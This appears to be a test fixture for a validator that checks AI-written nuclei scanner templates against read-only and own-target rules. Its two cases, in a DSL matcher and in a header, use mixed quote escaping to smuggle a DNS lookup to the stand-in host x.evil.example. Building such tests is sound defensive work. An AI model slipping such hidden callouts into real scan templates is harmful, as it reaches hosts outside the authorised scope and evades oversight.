description: AI-written or installed nuclei templates and the verdicts of the read-only check (cvENGINE validation.readonly_problem, cvengine_scanner.checks.readonly_problem) and of the own-target-and-port rule (checks.scope_problem). Both sides test against this file. "sentinel" is the verdict of the whole rule a Sentinel other than the built-in scanner applies (checks.check_problem, with the allowlist of cvengine_scanner.check_allowlist; the server: ai_checks.external_problem with cveFeed.check_allowlist).

id: c

cases.name: q_mixed_quote_dsl
cases.template:
id: c
info:
  name: c
  severity: info
http:
  - method: GET
    path: ["{{BaseURL}}/x"]
    matchers:
      - type: dsl
        dsl:
          - "contains(body, 'a\"+resolve(\"x.evil.example\",\"a\")+\"')"

cases.name: q_mixed_quote_header
cases.template:
id: c
info:
  name: c
  severity: info
http:
  - method: GET
    path: ["{{BaseURL}}/x"]
    headers:
      X-A: "{{concat('a\"+resolve(\"x.evil.example\",\"a\")+\"','')}}"
    matchers:
      - type: word
        words: ["x"]
